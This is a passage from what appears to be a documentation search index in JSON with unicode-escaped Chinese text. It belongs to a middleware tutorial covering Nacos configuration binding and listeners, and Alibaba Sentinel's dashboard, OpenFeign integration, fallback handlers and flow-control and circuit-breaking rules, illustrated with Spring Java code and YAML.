\u73b0\u5728\u6253\u5f00\u7f51\u9875\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u4e86\u914d\u7f6e\u4e2d\u7684\u5185\u5bb9\u3002 \u540c\u6837\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 @RefreshScope \u6ce8\u89e3\u6765\u5b9e\u73b0\u914d\u7f6e\u7684\u52a8\u6001\u5237\u65b0\u3002\u8fd9\u70b9\u5728\u4e4b\u524d\u7684\u6587\u7ae0\u4e2d\u5df2\u7ecf\u8bb2\u8fc7\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002","title":"\u4f7f\u7528 Value \u6ce8\u89e3"},{"location":"25/#configurationproperties","text":"\u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\u53ef\u4ee5\u6279\u91cf\u7b80\u5355\u5730\u83b7\u53d6\u914d\u7f6e\uff0c\u5373\u4f7f\u7528 @ConfigurationProperties \u6ce8\u89e3\u3002\u8fd9\u4e2a\u6ce8\u89e3\u53ef\u4ee5\u5c06\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u6620\u5c04\u5230\u4e00\u4e2a\u7c7b\u4e2d\uff0c\u7136\u540e\u76f4\u63a5\u6ce8\u5165\u8fd9\u4e2a\u7c7b\u5373\u53ef\u3002\u8fd9\u4e00\u70b9\u6211\u4eec\u4e4b\u524d\u6ca1\u6709\u8bb2\u8fc7\uff0c\u5728\u8fd9\u91cc\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0b\u3002 \u5728\u73b0\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u4f7f\u7528\uff0c @Data @Component @ConfigurationProperties(prefix = \"\") public class Config { private String hello; } \u8fd9\u6837\u76f4\u63a5\u6ce8\u5165\u8fd9\u4e2a Bean \u5373\u53ef\u3002\u6ce8\u610f\uff0c\u8fd9\u91cc\u4e0d\u9700\u8981 @RefreshScope \u6ce8\u89e3\uff0c\u4e5f\u4f1a\u81ea\u52a8\u5237\u65b0\u3002 \u6b64\u5916\uff0c\u8fd9\u4e2a\u7c7b\u4e2d\u5b57\u6bb5\u4e0e\u914d\u7f6e\u6587\u4ef6\u7684\u6620\u5c04\u89c4\u5219\u662f prefix.field \uff0c prefix \u5373\u6ce8\u89e3\u91cc\u9762\u7684\u53c2\u6570\uff0c field \u662f\u628a\u7c7b\u7684\u9a7c\u5cf0\u547d\u540d\u7684\u540d\u79f0\u8f6c\u6362\u4e3a kebab-case \u7684\u540d\u79f0\u3002\u4f8b\u5982\uff0c helloWorld \u5bf9\u5e94 hello-world \u3002\u53ea\u8981\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u7b26\u5408\u8fd9\u4e2a\u89c4\u5219\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u6ce8\u5165\u3002","title":"\u4f7f\u7528 ConfigurationProperties \u6ce8\u89e3"},{"location":"25/#_1","text":"\u6b64\u5916\u6211\u4eec\u8fd8\u53ef\u4ee5\u6dfb\u52a0\u914d\u7f6e\u53d8\u5316\u7684\u56de\u8c03\uff0c\u53ea\u8981\u5411 NacosConfigManager \u4e2d\u6dfb\u52a0\u76d1\u542c\u5668\u5373\u53ef\u3002 @Bean ApplicationRunner applicationRunner(NacosConfigManager nacosConfigManager) { return args -> { nacosConfigManager.getConfigService().addListener(\"d.yml\", \"DEFAULT_GROUP\", new Listener() { @Override public void receiveConfigInfo(String configInfo) { System.out.println(\"Config changed: \" + configInfo); } @Override public Executor getExecutor() { return Executors.newSingleThreadExecutor(); } }); }; }","title":"\u76d1\u542c\u914d\u7f6e\u53d8\u5316"},{"location":"26/","text":"\u4e2d\u95f4\u4ef6\u901f\u6210 Ch26 Sentinel Sentinel \u662f\u963f\u91cc\u5df4\u5df4\u5f00\u6e90\u7684\u4e00\u6b3e\u6d41\u91cf\u63a7\u5236\u3001\u7194\u65ad\u964d\u7ea7\u7684 Java \u4e2d\u95f4\u4ef6\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u5957\u5b8c\u6574\u7684\u6d41\u91cf\u63a7\u5236\u65b9\u6848\uff0c\u5305\u62ec\u6d41\u91cf\u63a7\u5236\u3001\u7194\u65ad\u964d\u7ea7\u3001\u7cfb\u7edf\u8d1f\u8f7d\u4fdd\u62a4\u7b49\u529f\u80fd\u3002Sentinel \u901a\u8fc7\u5b9e\u65f6\u7684\u76d1\u63a7\u7cfb\u7edf\u7684\u8fd0\u884c\u72b6\u6001\uff0c\u5bf9\u7cfb\u7edf\u7684\u6d41\u91cf\u8fdb\u884c\u5b9e\u65f6\u7684\u76d1\u63a7\uff0c\u5f53\u7cfb\u7edf\u7684\u6d41\u91cf\u8d85\u8fc7\u4e86\u9884\u8bbe\u7684\u9608\u503c\u65f6\uff0cSentinel \u4f1a\u5bf9\u6d41\u91cf\u8fdb\u884c\u63a7\u5236\uff0c\u4fdd\u62a4\u7cfb\u7edf\u7684\u7a33\u5b9a\u8fd0\u884c\u3002 \u76f8\u6bd4 Resilience4j\uff0cSentinel \u63d0\u4f9b\u4e86\u66f4\u591a\u7684\u6d41\u91cf\u63a7\u5236\u7b56\u7565\uff0c\u5305\u62ec\u6d41\u91cf\u63a7\u5236\u3001\u7194\u65ad\u964d\u7ea7\u3001\u7cfb\u7edf\u8d1f\u8f7d\u4fdd\u62a4\u7b49\u529f\u80fd\u3002Sentinel \u901a\u8fc7\u5b9e\u65f6\u7684\u76d1\u63a7\u7cfb\u7edf\u7684\u8fd0\u884c\u72b6\u6001\uff0c\u5bf9\u7cfb\u7edf\u7684\u6d41\u91cf\u8fdb\u884c\u5b9e\u65f6\u7684\u76d1\u63a7\uff0c\u5f53\u7cfb\u7edf\u7684\u6d41\u91cf\u8d85\u8fc7\u4e86\u9884\u8bbe\u7684\u9608\u503c\u65f6\uff0cSentinel \u4f1a\u5bf9\u6d41\u91cf\u8fdb\u884c\u63a7\u5236\uff0c\u4fdd\u62a4\u7cfb\u7edf\u7684\u7a33\u5b9a\u8fd0\u884c\u3002 Sentinel \u7684\u4fdd\u62a4\u7b56\u7565 Sentiel \u4fdd\u62a4\u7b56\u7565\u5982\u4e0b\u3002\u5bf9\u4e8e\u7528\u6237\u53ef\u4ee5\u8bbf\u95ee\u7684\u6bcf\u4e2a\u8d44\u6e90\uff0c\u53ef\u4ee5\u63d0\u4f9b\u82e5\u5e72\u89c4\u5219\uff0c\u4f8b\u5982\u6d41\u91cf\u63a7\u5236\uff0c\u670d\u52a1\u964d\u7ea7\u7b49\u3002\u5982\u679c\u8fdd\u53cd\u89c4\u5219\uff0c\u5219\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u8fdb\u884c Fallback\u3002\u5426\u5219\u76f4\u63a5\u653e\u884c\u3002 \u53ef\u4ee5\u770b\u51fa\uff0cSentinel \u4fdd\u62a4\u6709\u4e09\u4e2a\u5173\u952e\u70b9\uff1a\u5b9a\u4e49\u8d44\u6e90\uff0c\u5b9a\u4e49\u89c4\u5219\uff0cFallback \u903b\u8f91\u3002 Sentinel \u4f7f\u7528 \u9996\u5148\u542f\u52a8 Sentinel \u7684 Dashboard\uff0c\u8fd9\u91cc\u9700\u8981\u5728 \u8fd9\u91cc \u83b7\u53d6 jar \u5305\uff0c\u76f4\u63a5\u542f\u52a8\u5373\u53ef\u3002\u9ed8\u8ba4\u8d26\u53f7\u4e0e\u5bc6\u7801\u90fd\u662f Sentinel\u3002 \u7136\u540e\u5f15\u5165 Sentinel\u3002\u6b64\u5916\u4e3a\u4e86\u6f14\u793a\uff0c\u6211\u4eec\u8fd8\u5f15\u5165 OpenFeign\u3002Sentinel \u6709 OpenFeign \u7684\u96c6\u6210\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u3002 implementation 'org.springframework.cloud:spring-cloud-starter-openfeign:4.2.0' implementation 'com.alibaba.cloud:spring-cloud-starter-alibaba-sentinel:2023.0.3.2' implementation 'org.springframework.cloud:spring-cloud-starter-loadbalancer:4.2.0' \u73b0\u5728\u6211\u4eec\u518d\u521b\u5efa\u4e00\u4e2a\u5fae\u670d\u52a1\uff0c\u8ba9\u65b0\u7684\u5fae\u670d\u52a1\u8c03\u7528\u4e4b\u524d\u7684\u5fae\u670d\u52a1\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 OpenFeign \u6765\u8c03\u7528\u3002 package com.github.fingerbone; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.GetMapping; @FeignClient(value = \"app\") public interface TestClient { @GetMapping(\"/hello\") public String hello(); } package com.github.fingerbone; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.bind.annotation.GetMapping; @RestController public class TestController { @Autowired private TestClient testClient; @GetMapping(\"/delegate\") public String delegateHello() { return testClient.hello(); } } \u73b0\u5728\u76f4\u63a5\u542f\u52a8\u5373\u53ef\u3002\u6ce8\u610f\uff0cSentinel \u662f\u61d2\u52a0\u8f7d\u7684\uff0c\u6240\u4ee5\u9700\u8981\u8bbf\u95ee\u4e00\u6b21\u624d\u80fd\u5728 Dashboard \u4e0a\u770b\u5230\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u5f00\u542f eager \u6a21\u5f0f\u3002\u6b64\u5916\u8fd8\u8981\u914d\u7f6e spring.cloud.sentinel.transport.dashboard \u6765\u6307\u5b9a Dashboard \u7684\u5730\u5740\u3002 spring: cloud: sentinel: transport: dashboard: localhost:8080 eager: true \u6b64\u5916\uff0c\u8fd8\u8981\u5f00\u542f Sentinel \u7684 Feign \u6574\u5408\u3002 feign: sentinel: enabled: true \u53d1\u9001\u51e0\u4e2a\u8bf7\u6c42\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u5728 Dashboard \u4e0a\u770b\u5230\u4e86\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cSentinel \u4f1a\u628a\u6bcf\u4e00\u4e2a Web Endpoint \u4f5c\u4e3a\u4e00\u4e2a\u8d44\u6e90\u3002\u5982\u679c\u5f00\u542f\u4e86 Feign \u6574\u5408\uff0c\u90a3\u4e48 Feign \u7684\u8c03\u7528\u3002 \u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5411\u65b9\u6cd5\u4e0a\u6dfb\u52a0 @SentinelResource \u6ce8\u89e3\u6765\u5b9a\u4e49\u8d44\u6e90\u3002\u6ce8\u610f\uff0c\u6bcf\u4e00\u4e2a\u6709 @SentinelResource \u6ce8\u89e3\u7684\u65b9\u6cd5\u90fd\u4f1a\u88ab Sentinel \u4fdd\u62a4\u3002 @SentinelResource(value = \"hello\") \u7136\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u5728 Dashboard \u4e0a\u770b\u5230\u5b9a\u4e49\u7684\u8d44\u6e90\u3002 \u4e0d\u8fc7\u6ce8\u610f\uff0c @SentinelResouce \u6ce8\u89e3\u5e94\u8be5\u52a0\u5728\u975e Web Endpoint \u7684\u65b9\u6cd5\u4e0a\uff0c\u4f8b\u5982 Service \u5c42\u7684\u65b9\u6cd5\u3002 \u5982\u679c\u4e00\u4e2a\u8d44\u6e90\u83b7\u53d6\u4e86\u53e6\u4e00\u4e2a\u8d44\u6e90\uff0c\u5728 Dashboard \u4e0a\u4f1a\u6709\u8c03\u7528\u94fe\u7684\u663e\u793a\u3002 Sentinel Fallback \u673a\u5236 Sentinel \u5728\u89e6\u53d1\u65f6\uff0c\u4f1a\u629b\u51fa BlockException \u5f02\u5e38\u3002\u6709\u56db\u79cd\u60c5\u51b5\u6765\u5904\u7406\u8fd9\u4e2a\u5f02\u5e38\u3002 Web \u63a5\u53e3\u9519\u8bef\u5904\u7406 Sentinel \u4f1a\u8c03\u7528 BlockExceptionHandler \u6765\u5904\u7406\u5f02\u5e38\u3002\u53ef\u4ee5\u901a\u8fc7\u5b9e\u73b0 BlockExceptionHandler \u63a5\u53e3\u6765\u81ea\u5b9a\u4e49\u5f02\u5e38\u5904\u7406\u3002 public class CustomBlockExceptionHandler implements BlockExceptionHandler { @Override public void handle( HttpServletRequest request, HttpServletResponse response, String resouceName, BlockException e) throws Exception { response.setStatus(429); response.getWriter().write(\"Too many requests\"); } } @SentinelResource Fallback \u5bf9\u4e8e SentinelResouce \u7684 Fallback\uff0c\u53ef\u4ee5\u901a\u8fc7 fallback \u5c5e\u6027\u6765\u6307\u5b9a Fallback \u65b9\u6cd5\u3002\u6ce8\u610f\uff0c\u8fd8\u6709\u4e00\u4e2a\u53c2\u6570 blockHandler \uff0c\u5b83\u7684\u529f\u80fd\u4e0e fallback \u7c7b\u4f3c\uff0c\u4f46\u662f\u5b83\u66f4\u4f18\u5148\u3002 @SentinelResource(value = \"hello\", fallback = \"fallback\", blockHandler = \"blockHandler\") public String hello() { return \"Hello\"; } public String fallback(Throwable e) { return \"Fallback\"; } public String blockHandler(BlockException e) { return \"BlockHandler\"; } Fallback \u6216 BlockHandler \u7684\u51fd\u6570\u53c2\u6570\u6bd4\u539f\u672c\u7684\u51fd\u6570\u591a\u4e00\u4e2a\u53c2\u6570\uff0c\u5373\u5bf9\u5e94\u7684 Exception\u3002 \u5f53\u4e00\u4e2a\u5f02\u5e38\u88ab\u629b\u51fa\uff0c\u5982\u679c\u662f BlockException\uff0c\u5373 Sentinel \u89e6\u53d1\uff0c\u90a3\u4e48\u4f1a\u8c03\u7528 BlockHandler\uff0c\u5982\u679c\u6ca1\u6709 BlockHandler\uff0c\u90a3\u4e48\u4f1a\u8c03\u7528 Fallback\u3002\u5982\u679c\u6ca1\u6709 Fallback\uff0c\u90a3\u4e48\u4f1a\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\u5230 Spring \u5168\u5c40\u5f02\u5e38\u5904\u7406\u5668\u3002 \u5982\u679c\u662f\u5176\u5b83\u7c7b\u578b\u7684\u5f02\u5e38\uff0c\u4f1a\u76f4\u63a5\u8d70 Fallback\u3002 OpenFeign Fallback OpenFeign Fallback \u8d70\u7684\u662f OpenFeign \u7684 Fallback \u8fd4\u56de\uff0c\u4f8b\u5982\uff0c package com.github.fingerbone; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.GetMapping; @FeignClient(value = \"app\", fallback = TestClientFallback.class) public interface TestClient { @GetMapping(\"/hello\") public String hello(); } package com.github.fingerbone; import org.springframework.stereotype.Component; @Component public class TestClientFallback implements TestClient { @Override public String hello() { return \"Fallback\"; } } SphU try-catch \u6700\u540e\u4e00\u79cd\u65b9\u6cd5\u662f\u4f7f\u7528 SphU \u7684 try-catch \u65b9\u6cd5\u6765\u5904\u7406\u5f02\u5e38\u3002\u4e8b\u5b9e\u4e0a\uff0cSentinel \u4ee3\u7406\u4e86\u539f\u672c\u7684\u65b9\u6cd5\uff0c\u6bcf\u6b21\u8c03\u7528\u65f6\uff0c\u90fd\u4f1a\u4f7f\u7528 SphU \u7684 try-catch \u65b9\u6cd5\u6765\u5904\u7406\u5f02\u5e38\u3002 \u5373\u5bf9\u4e8e\u4e00\u4e2a\u53d7\u4fdd\u62a4\u7684\u51fd\u6570 func() \uff0c\u5b9e\u9645\u6267\u884c\u8fc7\u7a0b\u5982\u4e0b\uff0c try { SphU.entry(\"func\"); func(); } catch (BlockException e) { // Fallback } Sentinel \u6d41\u91cf\u63a7\u5236 \u4e0b\u9762\u4ecb\u7ecd Sentinel \u4e09\u79cd\u57fa\u7840\u4fdd\u62a4\u673a\u5236\u7684\u53c2\u6570\u3002 \u5bf9\u4e8e\u6d41\u91cf\u63a7\u5236\uff0c\u6709\uff0c \u6d41\u63a7\u6a21\u5f0f\u4e2d\uff0c\u76f4\u63a5\u6a21\u5f0f\u662f\u6307\u4e0d\u8003\u8651\u4efb\u4f55\u60c5\u51b5\uff0c\u53ea\u8981\u8bbf\u95ee\u8d44\u6e90\u7684\u6765\u6e90\u8d85\u8fc7\u4e86\u9608\u503c\uff0c\u5c31\u4f1a\u89e6\u53d1\u6d41\u63a7\u3002 \u94fe\u8def\u7b56\u7565\u6a21\u5f0f\u8981\u6307\u5b9a\u4e00\u4e2a\u5165\u53e3\u3002\u53ea\u6709\u6765\u81ea\u5165\u53e3\u7684\u6d41\u91cf\u8d85\u8fc7\u4e86\u9608\u503c\uff0c\u624d\u4f1a\u89e6\u53d1\u6d41\u63a7\u3002 \u4f7f\u7528\u94fe\u8def\u6a21\u5f0f\uff0c\u9700\u8981\u5c06 spring.cloud.sentinel.web-context-unify \u8bbe\u7f6e\u4e3a false \u3002\u5426\u5219\uff0cSentinel \u4e0d\u4f1a\u5c06\u4e0d\u540c WebEndpoint \u8c03\u7528\u7684\u540c\u4e00\u4e2a Service \u5206\u5217\u5f00\u3002 \u6700\u540e\u662f\u5173\u8054\u7b56\u7565\u3002\u5173\u8054\u7b56\u7565\u7684\u4f7f\u7528\u573a\u666f\u662f\u5199\u9891\u7e41\u65f6\u5bf9\u8bfb\u9650\u6d41\uff0c\u6ca1\u6709\u5199\u65f6\u5bf9\u8bfb\u4e0d\u9650\u6d41\u3002\u5173\u8054\u6a21\u5f0f\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u5173\u8054\u7684\u8d44\u6e90\uff0c\u53ea\u6709\u5173\u8054\u7684\u8d44\u6e90\u8d85\u8fc7\u4e86\u9608\u503c\uff0c\u81ea\u5df1\u4e5f\u8d85\u8fc7\u4e86\u9608\u503c\uff0c\u624d\u4f1a\u89e6\u53d1\u6d41\u63a7\u3002 \u6b64\u5916\u8fd8\u6709\u4e09\u79cd\u6d41\u63a7\u6548\u679c\uff0c \u5feb\u901f\u5931\u8d25\u6a21\u5f0f\u662f\u6307\u53ea\u8981\u89e6\u53d1\u6d41\u63a7\uff0c\u76f4\u63a5\u62d2\u7edd\u670d\u52a1\u3002 Warm Up \u6a21\u5f0f\u6709\u4e00\u4e2a\u989d\u5916\u7684 Period \u53c2\u6570\u3002\u5728 Period \u65f6\u95f4\u5185\uff0c\u6d41\u91cf\u9010\u6e10\u589e\u52a0\uff0c\u76f4\u5230\u8fbe\u5230\u9608\u503c\u3002\u589e\u52a0\u662f\u7ebf\u6027\u7684\uff0c\u51b7\u72b6\u6001\u662f QPS / Period \u4e2a\u8bf7\u6c42\uff0c\u4e4b\u540e\u79d2\u589e\u52a0\u5230 QPS \u4e2a\u8bf7\u6c42\u3002 \u6392\u961f\u7b49\u5f85\u6a21\u5f0f\u662f\u6307\u5f53\u6d41\u91cf\u8d85\u8fc7\u9608\u503c\u65f6\uff0c\u4e0d\u76f4\u63a5\u62d2\u7edd\u670d\u52a1\uff0c\u800c\u662f\u6392\u961f\u7b49\u5f85\u3002\u8fd9\u4e2a\u6a21\u5f0f\u9700\u8981\u6307\u5b9a\u4e00\u4e2a\u7b49\u5f85\u65f6\u95f4 timeout\uff0c\u5982\u679c\u7b49\u5f85\u65f6\u95f4\u8d85\u8fc7\u4e86\uff0c\u5c31\u4f1a\u62d2\u7edd\u670d\u52a1\u3002 Sentinel \u7194\u65ad\u964d\u7ea7 \u7194\u65ad\u7684\u4f5c\u7528\u662f\u5207\u65ad\u4e0d\u7a33\u5b9a\u7684\u8c03\u7528\u94fe\uff0c\u4f7f\u5f97\u67d0\u4e2a\u670d\u52a1\u5feb\u901f Fallback\uff0c\u4ee5\u907f\u514d\u670d\u52a1\u96ea\u5d29\u3002\u5426\u5728\uff0c\u5355\u4e2a\u670d\u52a1\u7684\u4e0d\u7a33\u5b9a\u53ef\u80fd\u4f1a\u88ab\u653e\u5927\u5bfc\u81f4\u6574\u4e2a\u7cfb\u7edf\u7684\u5d29\u6e83\u3002 \u7194\u65ad\u964d\u7ea7\u7528\u4e8e\u8fdc\u7a0b\u8c03\u7528\u90e8\u5206\uff0c\u8fd9\u91cc\u7684\u539f\u7406\u5df2\u7ecf\u5728 Resilience4j \u90e8\u5206\u4ecb\u7ecd\u8fc7\u4e86\uff0c\u5173\u4e8e\u6162\u8c03\u7528\uff0c\u5f02\u5e38\u6bd4\u4f8b\uff0c\u5f02\u5e38\u6570\u7b49\u3002 Sentinel \u70ed\u70b9\u53c2\u6570\u9650\u6d41 \u8fd9\u4e00\u529f\u80fd\u9002\u7528\u4e8e\u5bf9\u4e8e\u67d0\u4e2a\u8bbf\u95ee\u9891\u7e41\u7684\u53c2\u6570\uff0c\u4f8b\u5982\u5927\u5356\u7684\u67d0\u4e2a\u5546\u54c1 ID\uff0c\u5bf9\u4e8e\u8fd9\u4e2a\u5546\u54c1 ID \u7684\u8bbf\u95ee\u9891\u7387\u8d85\u8fc7\u4e86\u9608\u503c\uff0c\u5c31\u4f1a\u89e6\u53d1\u70ed\u70b9\u53c2\u6570\u9650\u6d41\u3002\u8fd9\u5c5e\u4e8e\u6d41\u91cf\u63a7\u5236\u7684\u66f4\u7ec6\u7c92\u5ea6\u7684\u63a7\u5236\uff0c\u53ef\u4ee5\u63a7\u5236\u53ea\u5bf9\u67d0\u4e2a\u53c2\u6570\u8fdb\u884c\u9650\u6d41\u3002","title":"Sentinel"},{"location":"26/#ch26-sentinel","text":"Sentinel \u662f\u963f\u91cc\u5df4\u5df4\u5f00\u6e90\u7684\u4e00\u6b3e\u6d41\u91cf\u63a7\u5236\u3001\u7194\u65ad\u964d\u7ea7\u7684 Java \u4e2d\u95f4\u4ef6\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u5957\u5b8c\u6574\u7684\u6d41\u91cf\u63a7\u5236\u65b9\u6848\uff0c\u5305\u62ec\u6d41\u91cf\u63a7\u5236\u3001\u7194\u65ad\u964d\u7ea7\u3001\u7cfb\u7edf\u8d1f\u8f7d\u4fdd\u62a4\u7b49\u529f\u80fd\u3002Sentinel \u901a\u8fc7\u5b9e\u65f6\u7684\u76d1\u63a7\u7cfb\u7edf\u7684\u8fd0\u884c\u72b6\u6001\uff0c\u5bf9\u7cfb\u7edf\u7684\u6d41\u91cf\u8fdb\u884c\u5b9e\u65f6\u7684\u76d1\u63a7\uff0c\u5f53\u7cfb\u7edf\u7684\u6d41\u91cf\u8d85\u8fc7\u4e86\u9884\u8bbe\u7684\u9608\u503c\u65f6\uff0cSentinel \u4f1a\u5bf9\u6d41\u91cf\u8fdb\u884c\u63a7\u5236\uff0c\u4fdd\u62a4\u7cfb\u7edf\u7684\u7a33\u5b9a\u8fd0\u884c\u3002 \u76f8\u6bd4 Resilience4j\uff0cSentinel \u63d0\u4f9b\u4e86\u66f4\u591a\u7684\u6d41\u91cf\u63a7\u5236\u7b56\u7565\uff0c\u5305\u62ec\u6d41\u91cf\u63a7\u5236\u3001\u7194\u65ad\u964d\u7ea7\u3001\u7cfb\u7edf\u8d1f\u8f7d\u4fdd\u62a4\u7b49\u529f\u80fd\u3002Sentinel \u901a\u8fc7\u5b9e\u65f6\u7684\u76d1\u63a7\u7cfb\u7edf\u7684\u8fd0\u884c\u72b6\u6001\uff0c\u5bf9\u7cfb\u7edf\u7684\u6d41\u91cf\u8fdb\u884c\u5b9e\u65f6\u7684\u76d1\u63a7\uff0c\u5f53\u7cfb\u7edf\u7684\u6d41\u91cf\u8d85\u8fc7\u4e86\u9884\u8bbe\u7684\u9608\u503c\u65f6\uff0cSentinel \u4f1a\u5bf9\u6d41\u91cf\u8fdb\u884c\u63a7\u5236\uff0c\u4fdd\u62a4\u7cfb\u7edf\u7684\u7a33\u5b9a\u8fd0\u884c\u3002","title":"\u4e2d\u95f4\u4ef6\u901f\u6210 Ch26 Sentinel"},{"location":"26/#sentinel","text":"Sentiel \u4fdd\u62a4\u7b56\u7565\u5982\u4e0b\u3002\u5bf9\u4e8e\u7528\u6237\u53ef\u4ee5\u8bbf\u95ee\u7684\u6bcf\u4e2a\u8d44\u6e90\uff0c\u53ef\u4ee5\u63d0\u4f9b\u82e5\u5e72\u89c4\u5219\uff0c\u4f8b\u5982\u6d41\u91cf\u63a7\u5236\uff0c\u670d\u52a1\u964d\u7ea7\u7b49\u3002\u5982\u679c\u8fdd\u53cd\u89c4\u5219\uff0c\u5219\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u8fdb\u884c Fallback\u3002\u5426\u5219\u76f4\u63a5\u653e\u884c\u3002 \u53ef\u4ee5\u770b\u51fa\uff0cSentinel \u4fdd\u62a4\u6709\u4e09\u4e2a\u5173\u952e\u70b9\uff1a\u5b9a\u4e49\u8d44\u6e90\uff0c\u5b9a\u4e49\u89c4\u5219\uff0cFallback \u903b\u8f91\u3002","title":"Sentinel \u7684\u4fdd\u62a4\u7b56\u7565"},{"location":"26/#sentinel_1","text":"\u9996\u5148\u542f\u52a8 Sentinel \u7684 Dashboard\uff0c\u8fd9\u91cc\u9700\u8981\u5728 \u8fd9\u91cc \u83b7\u53d6 jar \u5305\uff0c\u76f4\u63a5\u542f\u52a8\u5373\u53ef\u3002\u9ed8\u8ba4\u8d26\u53f7\u4e0e\u5bc6\u7801\u90fd\u662f Sentinel\u3002 \u7136\u540e\u5f15\u5165 Sentinel\u3002\u6b64\u5916\u4e3a\u4e86\u6f14\u793a\uff0c\u6211\u4eec\u8fd8\u5f15\u5165 OpenFeign\u3002Sentinel \u6709 OpenFeign \u7684\u96c6\u6210\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u3002 implementation 'org.springframework.cloud:spring-cloud-starter-openfeign:4.2.0' implementation 'com.alibaba.cloud:spring-cloud-starter-alibaba-sentinel:2023.0.3.2' implementation 'org.springframework.cloud:spring-cloud-starter-loadbalancer:4.2.0' \u73b0\u5728\u6211\u4eec\u518d\u521b\u5efa\u4e00\u4e2a\u5fae\u670d\u52a1\uff0c\u8ba9\u65b0\u7684\u5fae\u670d\u52a1\u8c03\u7528\u4e4b\u524d\u7684\u5fae\u670d\u52a1\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 OpenFeign \u6765\u8c03\u7528\u3002 package com.github.fingerbone; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.GetMapping; @FeignClient(value = \"app\") public interface TestClient { @GetMapping(\"/hello\") public String hello(); } package com.github.fingerbone; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.bind.annotation.GetMapping; @RestController public class TestController { @Autowired private TestClient testClient; @GetMapping(\"/delegate\") public String delegateHello() { return testClient.hello(); } } \u73b0\u5728\u76f4\u63a5\u542f\u52a8\u5373\u53ef\u3002\u6ce8\u610f\uff0cSentinel \u662f\u61d2\u52a0\u8f7d\u7684\uff0c\u6240\u4ee5\u9700\u8981\u8bbf\u95ee\u4e00\u6b21\u624d\u80fd\u5728 Dashboard \u4e0a\u770b\u5230\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u5f00\u542f eager \u6a21\u5f0f\u3002\u6b64\u5916\u8fd8\u8981\u914d\u7f6e spring.cloud.sentinel.transport.dashboard \u6765\u6307\u5b9a Dashboard \u7684\u5730\u5740\u3002 spring: cloud: sentinel: transport: dashboard: localhost:8080 eager: true \u6b64\u5916\uff0c\u8fd8\u8981\u5f00\u542f Sentinel \u7684 Feign \u6574\u5408\u3002 feign: sentinel: enabled: true \u53d1\u9001\u51e0\u4e2a\u8bf7\u6c42\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u5728 Dashboard \u4e0a\u770b\u5230\u4e86\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cSentinel \u4f1a\u628a\u6bcf\u4e00\u4e2a Web Endpoint \u4f5c\u4e3a\u4e00\u4e2a\u8d44\u6e90\u3002\u5982\u679c\u5f00\u542f\u4e86 Feign \u6574\u5408\uff0c\u90a3\u4e48 Feign \u7684\u8c03\u7528\u3002 \u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5411\u65b9\u6cd5\u4e0a\u6dfb\u52a0 @SentinelResource \u6ce8\u89e3\u6765\u5b9a\u4e49\u8d44\u6e90\u3002\u6ce8\u610f\uff0c\u6bcf\u4e00\u4e2a\u6709 @SentinelResource \u6ce8\u89e3\u7684\u65b9\u6cd5\u90fd\u4f1a\u88ab Sentinel \u4fdd\u62a4\u3002 @SentinelResource(value = \"hello\") \u7136\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u5728 Dashboard \u4e0a\u770b\u5230\u5b9a\u4e49\u7684\u8d44\u6e90\u3002 \u4e0d\u8fc7\u6ce8\u610f\uff0c @SentinelResouce \u6ce8\u89e3\u5e94\u8be5\u52a0\u5728\u975e Web Endpoint \u7684\u65b9\u6cd5\u4e0a\uff0c\u4f8b\u5982 Service \u5c42\u7684\u65b9\u6cd5\u3002 \u5982\u679c\u4e00\u4e2a\u8d44\u6e90\u83b7\u53d6\u4e86\u53e6\u4e00\u4e2a\u8d44\u6e90\uff0c\u5728 Dashboard \u4e0a\u4f1a\u6709\u8c03\u7528\u94fe\u7684\u663e\u793a\u3002","title":"Sentinel \u4f7f\u7528"},{"location":"26/#sentinel-fallback","text":"Sentinel \u5728\u89e6\u53d1\u65f6\uff0c\u4f1a\u629b\u51fa BlockException \u5f02\u5e38\u3002\u6709\u56db\u79cd\u60c5\u51b5\u6765\u5904\u7406\u8fd9\u4e2a\u5f02\u5e38\u3002","title":"Sentinel Fallback \u673a\u5236"},{"location":"26/#web","text":"Sentinel \u4f1a\u8c03\u7528 BlockExceptionHandler \u6765\u5904\u7406\u5f02\u5e38\u3002\u53ef\u4ee5\u901a\u8fc7\u5b9e\u73b0 BlockExceptionHandler 